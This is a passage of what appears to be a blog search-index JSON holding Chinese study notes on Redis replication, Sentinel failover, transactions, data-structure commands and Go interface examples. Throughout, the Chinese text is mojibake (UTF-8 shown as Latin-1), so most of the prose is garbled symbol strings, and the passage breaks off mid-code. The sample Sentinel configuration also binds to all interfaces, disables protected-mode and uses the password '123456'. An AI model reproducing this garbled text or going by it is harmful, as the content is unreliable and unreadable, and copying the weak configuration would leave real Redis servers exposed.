ï¼ˆtodo_0ï¼‰","uri":"/posts/ida%E9%80%86%E5%90%91%E4%BD%9C%E4%B8%9A%E7%BB%83%E4%B9%A0/"},{"categories":["Redis","æ•°æ®åº“"],"content":"Redisä¸»ä»å¤åˆ¶ã€å“¨å…µæ¨¡å¼å­¦ä¹ ç†è§£","date":"2024-07-12","objectID":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":["Redis"],"title":"Redisè¿›é˜¶å­¦ä¹ ç¬”è®°","uri":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Redis","æ•°æ®åº“"],"content":"ä¸»ä»æ¨¡å¼åŸºæœ¬æ¦‚å¿µ 1ï¸âƒ£ æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ 2ï¸âƒ£ ä¸»ä»å¤åˆ¶æ˜¯Redisé«˜å¯ç”¨çš„åŸºç¡€ï¼Œè¿˜æ˜¯å“¨å…µå’Œé›†ç¾¤èƒ½å¤Ÿå®æ–½çš„åŸºç¡€ 3ï¸âƒ£ ä¸»èŠ‚ç‚¹æä¾›å†™æœåŠ¡ï¼Œç”±ä»èŠ‚ç‚¹æä¾›è¯»æœåŠ¡ï¼ˆå³å†™Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä¸»èŠ‚ç‚¹ï¼Œè¯»Redisæ•°æ®æ—¶åº”ç”¨è¿æ¥ä»èŠ‚ç‚¹ï¼‰ 4ï¸âƒ£ åœ¨æœªå¼€å¯å“¨å…µæ¨¡å¼ä¸‹ï¼Œå¦‚æœä»æœºæ–­å¼€é‡è¿ï¼Œä¸ä¼šè‡ªåŠ¨è¿æ¥ä¸Šä¸»æœº 5ï¸âƒ£ ä»æœºåªèƒ½è¯»ï¼Œä¸èƒ½å†™ åŸºæœ¬æ­¥éª¤ é…ç½®æ–‡ä»¶å¤åˆ¶ cp redis_1.conf redis_2.conf ï¼‘ï¼ï¼‘ä¿®æ”¹ä»ä¸»æœºé…ç½®æ–‡ä»¶ï¼ˆredis2.confï¼‰ port 1234 pid name logfile dump.rdb ï¼‘ï¼ï¼’å¯åŠ¨å¹¶ä¸”æŸ¥çœ‹è¿è¡Œæƒ…å†µ redis-server confæ–‡ä»¶ ps -ef|grep redis å‘½ä»¤å‚æ•° info replication #æŸ¥çœ‹å½“å‰Redisä¿¡æ¯ slaveof 127.0.0.1 6379 # ç¡®å®šè¿™ä¸ªåº“ä¸ºä¸»æœº slaveof no one #è®©è‡ªå·±å˜æˆä¸»æœºï¼Œä½†æ˜¯ä»æœºéœ€è¦æ‰‹åŠ¨è¿æ¥åˆ°æ­¤ä¸»æœº å“¨å…µæ¨¡å¼åŸºæœ¬æ¦‚å¿µ 1ï¸âƒ£ å“¨å…µæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ è¿›ç¨‹ ï¼Œä½œä¸ºè¿›ç¨‹ï¼Œå®ƒä¼šç‹¬ç«‹è¿è¡Œã€‚å…¶åŸç†æ˜¯å“¨å…µé€šè¿‡å‘é€å‘½ä»¤ï¼Œç­‰å¾…RedisæœåŠ¡å™¨å“åº”ï¼Œä»è€Œç›‘æ§è¿è¡Œçš„å¤šä¸ªRediså®ä¾‹ã€‚ 2ï¸âƒ£ å¦‚æœä¸»æœºå®•æœºï¼Œä»æœºç«‹åˆ»é€‰å‡ºä¸€ä¸ªä¸»æœºï¼Œå¦‚æœä¹‹å‰ä¸»æœºå›æ¥åªèƒ½å½“ä»æœºï¼Œå“¨å…µçš„é»˜è®¤é…ç½®æ—¶é—´æ—¶ 30 ç§’ã€‚ åŸºæœ¬æ­¥éª¤ æ·»åŠ å“¨å…µé…ç½®æ–‡ä»¶ sentinel.conf å†…å®¹ä¸ºï¼š #æœåŠ¡ç›‘å¬åœ°å€ï¼Œç”¨äºå®¢æˆ·ç«¯è¿æ¥ï¼Œé»˜è®¤æœ¬æœºåœ°å€ bind 0.0.0.0 #æ˜¯å¦å·²åå°daemonæ–¹å¼å¯åŠ¨ daemonize yes #å®‰å…¨ä¿æŠ¤æ¨¡å¼ protected-mode no #å“¨å…µç«¯å£ port 26380 #æ—¥å¿—æ–‡ä»¶è·¯å¾„ logfile \"/myredis/sentinel26380.log\" #pidæ–‡ä»¶è·¯å¾„ pidfile /var/run/redis-sentinel26380.pid #å·¥ä½œç›®å½• dir /myredis #è®¾ç½®è¦ç›‘æ§çš„masteræœåŠ¡å™¨ï¼Œquorumè¡¨ç¤ºæœ€å°‘æœ‰å‡ ä¸ªå“¨å…µè®¤å¯å®¢è§‚ä¸‹çº¿ï¼ŒåŒæ„æ•…éšœè¿ç§»çš„æ³•å®šç¥¨æ•° sentinel monitor mymaster 192.168.10.110 6379 2 #masterè®¾ç½®äº†å¯†ç ï¼Œè¿æ¥masteræœåŠ¡çš„å¯†ç  sentinel auth-pass mymaster 123456 å¯åŠ¨å“¨å…µ redis-sentinel sentinel.conf --sentinel \u0026 æ•…éšœè½¬ç§» â„¹ï¸ é€‰ä¸»è¿‡ç¨‹ï¼š 1ï¸âƒ£ é€‰æ‹©ä¼˜å…ˆçº§æœ€é«˜çš„èŠ‚ç‚¹ï¼Œé€šè¿‡sentinelé…ç½®æ–‡ä»¶ä¸­çš„replica-priorityé…ç½®é¡¹ï¼Œè¿™ä¸ªå‚æ•°è¶Šå°ï¼Œè¡¨ç¤ºä¼˜å…ˆçº§è¶Šé«˜ 2ï¸âƒ£ å¦‚æœç¬¬ä¸€æ­¥ä¸­çš„ä¼˜å…ˆçº§ç›¸åŒï¼Œé€‰æ‹©offsetæœ€å¤§çš„ï¼Œoffsetè¡¨ç¤ºä¸»èŠ‚ç‚¹å‘ä»èŠ‚ç‚¹åŒæ­¥æ•°æ®çš„åç§»é‡ï¼Œè¶Šå¤§è¡¨ç¤ºåŒæ­¥çš„æ•°æ®è¶Šå¤š 3ï¸âƒ£ å¦‚æœç¬¬äºŒæ­¥offsetä¹Ÿç›¸åŒï¼Œé€‰æ‹©run idè¾ƒå°çš„ ","date":"2024-07-12","objectID":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Redis"],"title":"Redisè¿›é˜¶å­¦ä¹ ç¬”è®°","uri":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Redis","æ•°æ®åº“"],"content":"Redis äº‹åŠ¡ä¹è§‚é”å­¦ä¹ ç†è§£","date":"2024-07-11","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/","tags":["Redis"],"title":"RedisåŸºç¡€å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Redis","æ•°æ®åº“"],"content":"Redis-cli äº¤äº’å‘½ä»¤å‚æ•° è¿æ¥å‚æ•°ï¼š -h \u003chostname\u003e æŒ‡å®š Redis æœåŠ¡å™¨çš„ä¸»æœºåæˆ– IP åœ°å€ã€‚ -p \u003cport\u003e æŒ‡å®š Redis æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ -a \u003cpassword\u003e æä¾›å¯†ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚ -n \u003cdbnum\u003e é€‰æ‹©ç‰¹å®šçš„æ•°æ®åº“ï¼ˆé»˜è®¤ä¸º 0ï¼‰ã€‚ SSL/TLS å‚æ•°ï¼š --tls å¯ç”¨ SSL/TLS åŠ å¯†è¿æ¥ã€‚ --cacert \u003cfile\u003e æŒ‡å®šä¿¡ä»»çš„ CA è¯ä¹¦æ–‡ä»¶ã€‚ --cert \u003cfile\u003e å’Œ --key \u003cfile\u003e æŒ‡å®šå®¢æˆ·ç«¯è¯ä¹¦å’Œç§é’¥ã€‚ è¾“å…¥å’Œè¾“å‡ºå‚æ•°ï¼š -x å°†æ ‡å‡†è¾“å…¥è§†ä¸ºå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚ --raw å’Œ --no-raw åˆ†åˆ«ç”¨äºå¼ºåˆ¶åŸå§‹è¾“å‡ºæˆ–äººç±»å¯è¯»è¾“å‡ºã€‚ï¼ˆä¸­æ–‡ï¼‰ å…¶ä»–ç‰¹æ®Šå‘½ä»¤ï¼š PING æ£€æŸ¥ Redis æœåŠ¡å™¨æ˜¯å¦å“åº”ã€‚ INFO æ˜¾ç¤ºæœåŠ¡å™¨çš„å„ç§ä¿¡æ¯å’Œç»Ÿè®¡æ•°æ®ã€‚ äº‹åŠ¡ äº‹åŠ¡çš„ç‰¹æ€§ 1ï¸âƒ£ åŸå­æ€§ï¼ˆatomicityï¼‰ã€‚ä¸€ä¸ªäº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­åŒ…æ‹¬çš„æ“ä½œè¦ä¹ˆéƒ½åšï¼Œè¦ä¹ˆéƒ½ä¸åšã€‚ 2ï¸âƒ£ ä¸€è‡´æ€§ï¼ˆconsistencyï¼‰ã€‚äº‹åŠ¡å¿…é¡»æ˜¯ä½¿æ•°æ®åº“ä»ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€å˜åˆ°å¦ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚ä¸€è‡´æ€§ä¸åŸå­æ€§æ˜¯å¯†åˆ‡ç›¸å…³çš„ã€‚ 3ï¸âƒ£ éš”ç¦»æ€§ï¼ˆisolationï¼‰ã€‚ä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½è¢«å…¶ä»–äº‹åŠ¡å¹²æ‰°ã€‚å³ä¸€ä¸ªäº‹åŠ¡å†…éƒ¨çš„æ“ä½œåŠä½¿ç”¨çš„æ•°æ®å¯¹å¹¶å‘çš„å…¶ä»–äº‹åŠ¡æ˜¯éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„å„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½äº’ç›¸å¹²æ‰°ã€‚ 4ï¸âƒ£ æŒä¹…æ€§ï¼ˆdurabilityï¼‰ã€‚æŒä¹…æ€§ä¹Ÿç§°æ°¸ä¹…æ€§ï¼ˆpermanenceï¼‰ï¼ŒæŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±åº”è¯¥æ˜¯æ°¸ä¹…æ€§çš„ã€‚æ¥ä¸‹æ¥çš„å…¶ä»–æ“ä½œæˆ–æ•…éšœä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“ã€‚ #ï¸âƒ£åœ¨Redisäº‹åŠ¡æ²¡æœ‰æ²¡æœ‰éš”ç¦»çº§åˆ«çš„æ¦‚å¿µï¼ #ï¸âƒ£åœ¨Rediså•æ¡å‘½ä»¤å¼ä¿è¯åŸå­æ€§çš„ï¼Œä½†æ˜¯äº‹åŠ¡ä¸ä¿è¯åŸå­æ€§ï¼ å®ç°äº‹åŠ¡ multi # å¼€å¯äº‹åŠ¡\rexec # æ‰§è¡Œäº‹åŠ¡\rdiscard # æ”¾å¼ƒäº‹åŠ¡\r### ç¼–è¯‘æ—¶æŠ¥é”™ï¼Œæ‰€æœ‰éƒ½ä¸ä¼šè¢«æ‰§è¡Œï¼ˆä¸€å¼€å§‹å°±æŠ¥é”™ï¼‰\r### è¿è¡Œæ—¶æŠ¥é”™ï¼Œå…¶ä»–å‘½ä»¤æ­£å¸¸æ‰§è¡Œä¹è§‚é” ä¹è§‚é”çš„ç‰¹æ€§ 1ï¸âƒ£ å½“ç¨‹åºä¸­å¯èƒ½å‡ºç°å¹¶å‘çš„æƒ…å†µæ—¶ï¼Œå°±éœ€è¦ä¿è¯åœ¨å¹¶å‘æƒ…å†µä¸‹æ•°æ®çš„å‡†ç¡®æ€§ï¼Œä»¥æ­¤ç¡®ä¿å½“å‰ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·ä¸€èµ·æ“ä½œæ—¶ï¼Œæ‰€å¾—åˆ°çš„ç»“æœå’Œä»–å•ç‹¬æ“ä½œæ—¶çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚ 2ï¸âƒ£ æ²¡æœ‰åšå¥½å¹¶å‘æ§åˆ¶ï¼Œå°±å¯èƒ½å¯¼è‡´è„è¯»ã€å¹»è¯»å’Œä¸å¯é‡å¤è¯»ç­‰é—®é¢˜ã€‚ watch key #ç›‘è§†é”\runwatch key #å–æ¶ˆç›‘è§†","date":"2024-07-11","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/:0:0","tags":["Redis"],"title":"RedisåŸºç¡€å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Redis","æ•°æ®åº“"],"content":"Redis çš„å…«ç§æ•°æ®ç»“æ„","date":"2024-07-10","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/","tags":["Redis"],"title":"RedisåŸºç¡€å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Redis","æ•°æ®åº“"],"content":"Redis çš„å…«ç§æ•°æ®ç»“æ„ String å­—ç¬¦ä¸² 1ï¸âƒ£ æ”¯æŒäºŒè¿›åˆ¶ï¼ˆå¯å­˜å‚¨å›¾ç‰‡æˆ–åºåˆ—åŒ–å¯¹è±¡ï¼‰ï¼Œå•ä¸ªæœ€å¤§512MBã€‚ 2ï¸âƒ£ ä¸€ä¸ªKeyå¯¹åº”ä¸€ä¸ªValueï¼Œå¹¶ä¸”Setä¹‹åä¼šè¦†ç›–ä¹‹å‰æ‰€å­˜å‚¨çš„å€¼ã€‚ åŸºæœ¬è¯­æ³•ï¼š set key value getrange key start end # å­—ç¬¦ä¸²å€¼çš„å­å­—ç¬¦ï¼ˆå•ä¸ªå­—ç¬¦ï¼‰ exists key # åˆ¤æ–­å­˜åœ¨è¿”å›1ï¼Œä¸å­˜åœ¨åˆ™è¿”å›0 append key value # è¿½åŠ åˆ°valueåˆ°åŸå€¼ä¹‹å strlen key # æŸ¥çœ‹å­—ç¬¦ä¸²é•¿åº¦ incr key 10 # è‡ªå¢1 incrby key 10 è‡ªå¢10 decr key # è‡ªå‡1 decrby key 10 è‡ªå‡10 setrange key start vakue # åœ¨Startä½ç½®æ›¿æ¢ä¸ºvalue setnx key value #å¦‚æœé”®å­˜åœ¨ï¼Œåˆ™ä¸è®¾ç½®å€¼ mset k1 v1 k2 v2 #è®¾ç½®å¤šä¸ªé”®å€¼ mget k1 k2 #è·å–å¤šä¸ªå€¼ msetnx k1 v1 k2 v2 #è¦ä¹ˆéƒ½æˆåŠŸè®¾ç½®ï¼Œè¦ä¹ˆéƒ½å¤±è´¥ getset key value #å¦‚æœå·²å­˜åœ¨Keyï¼Œå…ˆæ˜¾ç¤ºæ—§valueå†è¿›è¡Œæ›¿æ¢ï¼Œå¦‚æœæ²¡æœ‰åˆ™ç›´æ¥å†™å…¥ mset a:1:name Scan # æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º é”®å€¼è¿‡æœŸï¼š ttl key #æŸ¥è¯¢è¿‡æœŸæ—¶é—´ -1æ°¸ä¸è¿‡æœŸ -2å·²è¿‡æœŸ expire key time #è®¾ç½®keyçš„è¿‡æœŸæ—¶é—´ï¼Œå‰ææ˜¯Keyå·²å­˜åœ¨ setex key time value #è®¾ç½®keyçš„è¿‡æœŸæ—¶é—´ï¼Œå¯ä»¥åŒæ—¶è®¾ç½®é”®å€¼ Hashå¯¹è±¡ â„¹ï¸ æ˜¯ä¸€ä¸ªStringç±»å‹çš„fieldå’Œvalueçš„æ˜ å°„è¡¨ï¼Œé€‚åˆå½“å¯¹è±¡ hset key field value # è®¾ç½®å•ä¸ªå±æ€§ hmset key field value field value # è®¾ç½®å¤šä¸ªå±æ€§ hget hgetall #ä¸€ä¸ªæ˜¯æŸ¥è¯¢å•ä¸ª ä¸€ä¸ªæ˜¯æŸ¥è¯¢æ‰€æœ‰ hdel key field #åˆ é™¤hashä¸­æŒ‡å®šçš„å€¼ hlen key #è·å–é•¿åº¦ hexists key field #åˆ¤æ–­å€¼æ˜¯å¦å­˜åœ¨ hvals #è·å–æ‰€æœ‰å€¼ è·å–æ‰€æœ‰é”® hkey #è·å–æ‰€æœ‰é”® hincrby key field å€¼ #è‡ªå¢è‡ªå‡æ“ä½œ å¡«æ•°å­— hsetnx #å­˜åœ¨åˆ™ä¸æ·»åŠ  æ— åºé›†åˆ â„¹ï¸ å…ƒç´ æ²¡æœ‰é‡å¤çš„ï¼Œéƒ½æ˜¯å•ä¸ªçš„ sadd key å…ƒç´  #å¯æ·»åŠ å¤šä¸ªå…ƒç´  scard key #æŸ¥çœ‹å…ƒç´ é•¿åº¦ï¼ˆä¸ªæ•°ï¼‰ smembers key #æŸ¥çœ‹å…ƒç´  srem key member #ç§»é™¤æŒ‡å®šå…ƒç´ ï¼ˆå¯å¤šä¸ªï¼‰ srandmember key num #éšæœºæŠ½å–numä¸ªå…ƒç´ ï¼Œä¸å¡«å†™ä¸ªæ•°é»˜è®¤æŠ½å–ä¸€ä¸ªå¹¶ä¸”ä¸æ˜¾ç¤ºåºå· spop key #åˆ é™¤éšæœºå…ƒç´  smove key newkey value #å¯åŠ¨valueåˆ°newkey #äº¤é›† å¹¶é›† å·®é›† sdiff k1 k2 # æ±‚å·®é›†ï¼š k1æœ‰çš„å…ƒç´ ã€k2ä¸­å´æ²¡æœ‰çš„å…ƒç´  sinter k1 k2 # æ±‚äº¤é›†ï¼š k1,k2éƒ½æœ‰çš„å…ƒç´  sunion k1 k2 k3# æ±‚å¹¶é›†(åŒ…æ‹¬é‡å¤çš„)ï¼š k1 k2 k3 åˆèµ·æ¥çš„å…ƒç´  æœ‰åºé›†åˆ zadd key score value #æ·»åŠ å€¼ã€scoreå€¼ zrange key #æŸ¥è¯¢å€¼ zrangebyscore key -inf +inf #æ ¹æ®valueçš„scoreå€¼ä»å°åˆ°å¤§æ’åˆ— zrevrabge key #æ ¹æ®valueçš„scoreå€¼ä»å¤§åˆ°å°æ’åˆ— zrangebyscore key -inf +inf withscores #æŸ¥è¯¢æ‰€æœ‰çš„å€¼åŒ…æ‹¬key zcard key #æŸ¥è¯¢é›†åˆé‡Œçš„å…ƒç´ ä¸ªæ•° zrem key å…ƒç´ # ç§»é™¤æŒ‡å®šå…ƒç´ ã€å¯å¤šä¸ª zcount key min max #å¦‚æœåœ¨min æˆ–è€… max å‰æ·»åŠ  ï¼ˆ åˆ™ä¸ºé—­åŒºé—´ åŒä¸€ä¸ªå…ƒç´ å¯ä»¥æœ‰å¤šä¸ªåˆ†æ•°ï¼Œæ¯ä¸ªåˆ†æ•°å¯¹åº”ä¸€ä¸ªä¸åŒçš„æ’åºä½ç½® åˆ—è¡¨ lpush key value #å·¦æ’å…¥æ•°æ®ï¼ˆå¯ä»¥å¤šä¸ªï¼‰ rpush key value #å³æ’å…¥æ•°æ®ï¼ˆå¯ä»¥å¤šä¸ªï¼‰ lpop #ä»æœ€å·¦è¾¹ç§»é™¤æ•°æ® rpop #ä»æœ€å³è¾¹ç§»é™¤æ•°æ® lrange key start end #endä¸º-1æ—¶ æŸ¥æ‰€æœ‰ lindex key 0 #æŸ¥è¯¢æŒ‡å®šä¸‹æ ‡å…ƒç´  llen key #è·å–æŒ‡å®šåˆ—è¡¨çš„å…ƒç´ é•¿åº¦ lrem key æ•°é‡ value #å½“æ•°é‡ä¸º0æ—¶ï¼Œåˆ é™¤æ‰€æœ‰value ltrim key start end #æˆªå–å…ƒç´ ï¼Œä¸‹æ ‡ä»0å¼€å§‹ rpoplpush key newkey #ç§»é™¤keyçš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåˆ°newkeyé‡Œ lset key ä¸‹æ ‡å€¼ newvalue #æ›´æ–°/æ›¿æ¢ ä¸‹æ ‡æ‰€åœ¨çš„å…ƒç´  ä¸º newvalue linsert key after/before value newvalue # åœ¨keyçš„valueä¹‹å‰æˆ–è€…ä¹‹å æ·»åŠ newvalue åœ°ç†ä½ç½® â„¹ï¸ æœ‰æ•ˆçš„ç»åº¦ä»-180åº¦åˆ°180åº¦ï¼Œæœ‰æ•ˆçš„çº¬åº¦ä»-85.05112878åº¦åˆ°85.05112878åº¦ â„¹ï¸ æœ¬è´¨ä¸Šæ˜¯æœ‰åºé›†åˆæ•°æ®ç±»å‹ï¼Œå®˜æ–¹åšäº†äºŒæ¬¡åŒ…è£… geoadd ç´¢å¼•å€¼ ç»åº¦ çº¬åº¦ åœ°ç‚¹ #geoadd city ç»åº¦ ç»´åº¦ \"æ¼‚äº®å›½\" geopos city Beijing Shanghai #æŸ¥çœ‹æŒ‡å®šåŸå¸‚çš„ç»çº¬åº¦ä¿¡æ¯ï¼Œæ”¯æŒå¤šä¸ª geodis city Beijing Shanghai (å¯åŠ å•ä½ é»˜è®¤å•ä½ç±³) # è®¡ç®—ä¸¤ç‚¹è·ç¦» georadius city ç»åº¦ çº¬åº¦ è·ç¦» (å¯åŠ å•ä½ é»˜è®¤å•ä½ç±³) # æŸ¥è¯¢æŒ‡å®šåæ ‡èŒƒå›´çš„åŸå¸‚ å¯åŠ å‚æ•°ï¼š1.withcoord # è¿”å›èŒƒå›´å†…åŸå¸‚çš„å…ƒç´ åæ ‡ 2.withdist #è¿”å›ä¸ä¸­å¿ƒåº—çš„è·ç¦» 3.count #é™åˆ¶è¿”å›å¤šå°‘ä¸ªåŸå¸‚æ•°é‡ georadiusbymember city åœ°ç‚¹ è·ç¦» (å¯åŠ å•ä½ é»˜è®¤å•ä½ç±³) #æŸ¥è¯¢æŒ‡å®šåŸå¸‚åœ°ç‚¹çš„èŒƒå›´åœ°ç‚¹åŸå¸‚ ä½å›¾(Bitmap) â„¹ï¸ åªæœ‰ 0 å’Œ 1 ä¸¤ ä¸ª çŠ¶ æ€ setbit key offset 0/1 #è®¾ç½®å€¼ä¸º0æˆ–1 getbit key offset #æŸ¥è¯¢offsetæ˜¯å¦ä¸º1 bitcount key #é»˜è®¤æŸ¥è¯¢å¤šå°‘ä¸ªæ˜¯1 åœ¨ä¸Šä¸‹å­¦ã€åœ¨çº¿çŠ¶æ€çš„åœºæ™¯ä¸‹å®ç”¨ã€‚ åŸºæ•°(æ•°æ®é›†) â„¹ï¸ å ç”¨çš„å†…å­˜æ˜¯å›ºå®šçš„ï¼Œ2^64ä¸ªå…ƒç´ ï¼Œç›¸å½“äºåªéœ€è¦12kbçš„å†…å­˜å³å¯ã€‚æ•ˆç‡æé«˜ï¼ pfadd key element #æ·»åŠ æ•°æ®é›† pfcount key #ç»Ÿè®¡æ•°æ®é›†çš„å…ƒç´ ä¸ªæ•° pfmegre k1 k2 #åˆå¹¶å¹¶ä¸”å»é‡ ","date":"2024-07-10","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/:0:0","tags":["Redis"],"title":"RedisåŸºç¡€å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Golang"],"content":"Golangçš„æ¥å£æ˜¯ä¸€ç§æŠ½è±¡çš„ç±»å‹ Goè¯­è¨€ä¸­çš„æ¥å£ï¼ˆinterfaceï¼‰æ˜¯ä¸€ç»„æ–¹æ³•ç­¾åçš„é›†åˆï¼Œæ˜¯ä¸€ç§æŠ½è±¡ç±»å‹ã€‚æ¥å£å®šä¹‰äº†æ–¹æ³•ï¼Œä½†æ²¡æœ‰å®ç°ï¼Œè€Œæ˜¯ç”±å…·ä½“çš„ç±»å‹ï¼ˆstructï¼‰å®ç°è¿™äº›æ–¹æ³•ï¼Œå› æ­¤æ¥å£æ˜¯ä¸€ç§å®ç°å¤šæ€çš„æœºåˆ¶ã€‚ æ¥å£å®šä¹‰ type æ¥å£åç§°er interface{ func(arg1 ç±»å‹,arg2 ç±»å‹2) è¿”å›å€¼ func(arg3 ç±»å‹3) è¿”å›å€¼3 } //æœ€å¥½ä»¥erç»“å°¾è¡¨ç¤º ä¸åŠ funcä¹Ÿå¯ä»¥ ç»“æ„ä½“å®šä¹‰ type ç»“æ„ä½“åç§° struct{ Name ç±»å‹ï¼ˆstringã€intã€boolç­‰ï¼‰ } å…¸å‹Demo package main import ( \"fmt\" ) // Worker æ¥å£å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³• Work type Worker interface { Work() } // programmer ç»“æ„ä½“ä»£è¡¨ä¸€ä¸ªç¨‹åºå‘˜,å®šä¹‰æ•°æ®ç±»å‹ type programmer struct { Java string Linux string Python string } // Work å®ç°äº† Worker æ¥å£çš„æ–¹æ³• func (p *programmer) Work() { // è¾“å‡ºç¨‹åºå‘˜çš„ç±»å‹å’Œä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ fmt.Printf(\"å°ææ­£åœ¨å­¦ä¹ %s\\n\", p.Java) fmt.Printf(\"å°å¼ æ­£åœ¨å­¦ä¹ %s\\n\", p.Linux) fmt.Printf(\"å°ç‹æ­£åœ¨å­¦ä¹ %s\\n\", p.Python) } func main() { // åˆ›å»ºä¸€ä¸ª programmer å®ä¾‹ï¼Œå¹¶åˆå§‹åŒ–å­—æ®µ myProgrammer := programmer{ Java: \"Javaè¯­è¨€\", Linux: \"Linuxè¿ç»´\", Python: \"Pythonè¯­è¨€\", } var Myworker Worker = \u0026myProgrammer // æ¥å£å˜é‡èµ‹å€¼ä¹Ÿå«å®ç°ç»“æ„ä½“ Myworker.Work() //è°ƒç”¨æ¥å£æ–¹æ³• } ä¿¡æ¯ ä»¥ ä¸Š ä»£ ç  ä½œ ä¸º åŸº ç¡€ è¿› è¡Œ æ‹“ å±• ä¸€ä¸ªç±»å‹å®ç°å¤šä¸ªæ¥å£ package main import ( \"fmt\" \"time\" ) // Worker æ¥å£å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³• Work type Worker interface { Work() } type Stoper interface { Stop() } // programmer ç»“æ„ä½“ä»£è¡¨ä¸€ä¸ªç¨‹åºå‘˜ type programmer struct { Java string Linux string Python string } // Work å®ç°äº† Worker æ¥å£çš„æ–¹æ³• func (p *programmer) Work() { //æŒ‡é’ˆæ¥æ”¶è€…å¯ä»¥ä¿®æ”¹å­—æ®µå€¼ // è¾“å‡ºç¨‹åºå‘˜çš„ç±»å‹å’Œä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ fmt.Printf(\"å°ææ­£åœ¨å­¦ä¹ %s\\n\", p.Java) fmt.Printf(\"å°å¼ æ­£åœ¨å­¦ä¹ %s\\n\", p.Linux) fmt.Printf(\"å°ç‹æ­£åœ¨å­¦ä¹ %s\\n\", p.Python) } func (p programmer) Stop() { //å€¼æ¥æ”¶è€…ä¸ä¿®æ”¹å­—æ®µå€¼ fmt.Printf(\"å°æå·²ç»åœæ­¢å­¦ä¹ %s\\n\", p.Java) fmt.Printf(\"å°å¼ å·²ç»åœæ­¢å­¦ä¹ %s\\n\", p.Linux) fmt.Printf(\"å°ç‹å·²ç»åœæ­¢å­¦ä¹ %s\\n\", p.Python) } func main() { // åˆ›å»ºä¸€ä¸ª programmer å®ä¾‹ï¼Œå¹¶åˆå§‹åŒ–å­—æ®µ myProgrammer := programmer{ Java: \"Javaè¯­è¨€\", Linux: \"Linuxè¿ç»´\", Python: \"Pythonè¯­è¨€\", } x1 := programmer{} // æ¥å£å˜é‡èµ‹å€¼ä¹Ÿå«å®ç°ç»“æ„ä½“ var Myworker Worker = \u0026myProgrammer // æ¥å£å˜é‡èµ‹å€¼ä¹Ÿå«å®ç°ç»“æ„ä½“ Myworker.Work() //è°ƒç”¨æ¥å£æ–¹æ³• time.Sleep(time.Second * 2) x1.Stop() } å¤šä¸ªç±»å‹å®ç°ä¸€ä¸ªæ¥å£ package main import ( \"fmt\" ) // Worker æ¥å£å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³• Work type Worker interface { Work() } // programmer ç»“æ„ä½“ä»£è¡¨ä¸€ä¸ªç¨‹åºå‘˜ type programmer struct { Python string } type older struct { age int } func (p programmer) Work() { fmt.Printf(\"%sçš„ç¨‹åºå‘˜æ­£åœ¨å·¥ä½œ\", p.Python) fmt.Println(\"\") //æ¢è¡Œ } func (o older) Work() { fmt.Printf(\"%då²çš„ç¨‹åºå‘˜æ­£åœ¨å·¥ä½œ\", o.age) } func main() { // åˆ›å»ºä¸€ä¸ª programmer å®ä¾‹ï¼Œå¹¶åˆå§‹åŒ–å­—æ®µ myProgrammer := programmer{ Python: \"Python\", } o := older{age: 20} var Myworker Worker = \u0026myProgrammer // 